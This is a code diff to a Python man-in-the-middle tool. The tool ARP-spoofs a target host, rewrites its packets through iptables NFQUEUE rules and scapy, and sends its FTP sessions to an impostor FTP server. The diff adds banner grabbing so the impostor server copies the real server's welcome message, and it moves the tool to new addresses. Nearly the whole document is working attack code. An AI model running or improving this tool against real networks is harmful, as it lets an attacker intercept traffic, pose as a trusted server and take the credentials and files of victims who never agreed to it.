@@ -2,10 +2,11 @@ import re
 import signal
 import subprocess
 import sys
-import threading
+import os
 import time
 from ipaddress import ip_network
 from multiprocessing import Event, Manager, Process
+from ftplib import FTP
 
 from netfilterqueue import NetfilterQueue
 from pyftpdlib.authorizers import DummyAuthorizer
@@ -14,15 +15,17 @@ from pyftpdlib.servers import FTPServer
 from scapy.all import ARP, IP, TCP, Ether, send, srp
 
 # Configuration
-fake_ftp_ip = "192.168.2.128"
-gateway_ip = "192.168.2.1"
-ftp_ip = "192.168.2.200"
-target_ip = "192.168.2.130"
-interface_name = "ens33"
+mitm_ip = "10.1.1.2"
+gateway_ip = "10.1.1.1"
+ftp_ip = "10.1.2.2"
+target_ip = "10.1.1.3"
+interface_name = "eth0"
 
 # More configuration, that most likely won't need to be meddled
-fake_ftp_serve_directory = "/home/"
-fake_ftp_port = 2121
+username = os.environ.get("SUDO_USER", os.environ.get("USERNAME"))
+home_dir = os.path.expanduser(f"~{username}")
+mitm_ftp_serve_directory = home_dir + os.path.sep + "ftp"
+mitm_ftp_port = 2121
 ftp_port = 21
 netmask = 24
 
@@ -99,17 +102,17 @@ def sigint_handler(a, b):
     sys.exit()
 
 
-def start_ftp_server():
+def start_ftp_server(banner):
     """Starts the FTP server using pyftpd"""
     authorizer = DummyAuthorizer()
-    authorizer.add_anonymous(fake_ftp_serve_directory)
+    authorizer.add_anonymous(mitm_ftp_serve_directory)
 
     handler = FTPHandler
     handler.authorizer = authorizer
-    handler.banner = "(Sibei Secure FTPd 0.0.1)"
+    handler.banner = banner
 
     # listen on every IP on my machine on port 21
-    address = ("0.0.0.0", fake_ftp_port)
+    address = ("0.0.0.0", mitm_ftp_port)
     server = FTPServer(address, handler)
     Process(target=server.serve_forever, daemon=True).start()
 
@@ -206,6 +209,8 @@ def add_iptable_rules():
             "NFQUEUE",
             "--queue-num",
             "1",
+            "--source",
+            target_ip,
             "--destination",
             ftp_ip,
         ]
@@ -222,34 +227,15 @@ def add_iptable_rules():
             "-j",
             "ACCEPT",
             "--source",
-            fake_ftp_ip,
+            mitm_ip,
+            "--destination",
+            target_ip,
             "-p",
             "tcp",
             "-m",
             "multiport",
             "--sports",
             "8080",
-        ]
-    )
-    subprocess.check_output(
-        [
-            "iptables",
-            "-t",
-            "mangle",
-            "-A",
-            "POSTROUTING",
-            "-o",
-            interface_name,
-            "-j",
-            "ACCEPT",
-            "--source",
-            fake_ftp_ip,
-            "-p",
-            "tcp",
-            "-m",
-            "multiport",
-            "--dports",
-            "80,443",
         ]
     )
     subprocess.check_output(
@@ -268,7 +254,9 @@ def add_iptable_rules():
             "--queue-num",
             "2",
             "--source",
-            fake_ftp_ip,
+            mitm_ip,
+            "--destination",
+            target_ip,
         ]
     )
 
@@ -302,7 +290,7 @@ def incoming(packet):
 
     if not to_intercept_incoming(pkt):
         # "Forwards" the packet normally
-        if IP in pkt and pkt[IP].dst != fake_ftp_ip:
+        if IP in pkt and pkt[IP].dst != mitm_ip:
             pkt[IP].ttl = pkt[IP].ttl + 1
             pkt[IP].len = None
             pkt[IP].chksum = None
@@ -313,10 +301,10 @@ def incoming(packet):
 
     # Guaranteed to have both TCP and IP in layer
     process_incoming_ftp_packet(pkt)
-    pkt[IP].dst = fake_ftp_ip
+    pkt[IP].dst = mitm_ip
 
     if pkt[TCP].dport == ftp_port:
-        pkt[TCP].dport = fake_ftp_port
+        pkt[TCP].dport = mitm_ftp_port
     elif pkt[TCP].flags.F:
         if pkt[TCP].dport in ftp_pasv_data_port:
             ftp_pasv_data_port[pkt[TCP].dport] = 1
@@ -360,7 +348,7 @@ def process_incoming_ftp_packet(pkt):
     ftp_active_data_port[calculated_port] = 0
 
 
-def modify_ftp_packet(pkt):
+def process_outgoing_ftp_packet(pkt):
     """Modifies the ftp packet such that it points to the MiTM"""
     if TCP not in pkt:
         return
@@ -396,8 +384,8 @@ def to_intercept_outgoing(pkt):
     if IP not in pkt or TCP not in pkt:
         return False
 
-    return pkt[IP].src == fake_ftp_ip and (
-        pkt[TCP].sport == fake_ftp_port
+    return pkt[IP].src == mitm_ip and (
+        pkt[TCP].sport == mitm_ftp_port
         or pkt[TCP].sport in ftp_pasv_data_port
         or pkt[TCP].dport in ftp_active_data_port
     )
@@ -417,9 +405,9 @@ def outgoing(packet):
     # Guaranteed to have both TCP and IP in the packet
     pkt[IP].src = ftp_ip
 
-    if pkt[TCP].sport == fake_ftp_port:
+    if pkt[TCP].sport == mitm_ftp_port:
         pkt[TCP].sport = ftp_port
-        modify_ftp_packet(pkt)
+        process_outgoing_ftp_packet(pkt)
     elif ftp_pasv_data_port.get(pkt[TCP].sport, None):
         del ftp_pasv_data_port[pkt[TCP].sport]
     elif ftp_active_data_port.get(pkt[TCP].dport, None):
@@ -434,8 +422,18 @@ def outgoing(packet):
     packet.accept()
 
 
+def ftp_banner_grab():
+    try:
+        with FTP(ftp_ip) as ftp_connection:
+            return ftp_connection.getwelcome()
+    except Exception:
+        pass
+    return "(Sibei Secure FTPd 0.0.1)"
+
+
 def main():
-    start_ftp_server()
+    banner = ftp_banner_grab()
+    start_ftp_server(banner)
 
     arpspoof_wrapper()
 
@@ -448,8 +446,14 @@ def main():
     outgoing_nfqueue = NetfilterQueue()
     outgoing_nfqueue.bind(2, outgoing)
 
-    Process(target=incoming_nfqueue.run, daemon=True).start()
-    Process(target=outgoing_nfqueue.run, daemon=True).start()
+    def run_nfqueue(nfqueue):
+        try:
+            nfqueue.run()
+        except KeyboardInterrupt:
+            pass
+
+    Process(target=run_nfqueue, args=(incoming_nfqueue,), daemon=True).start()
+    Process(target=run_nfqueue, args=(outgoing_nfqueue,), daemon=True).start()
 
     signal.signal(signal.SIGINT, sigint_handler)
     signal.pause()
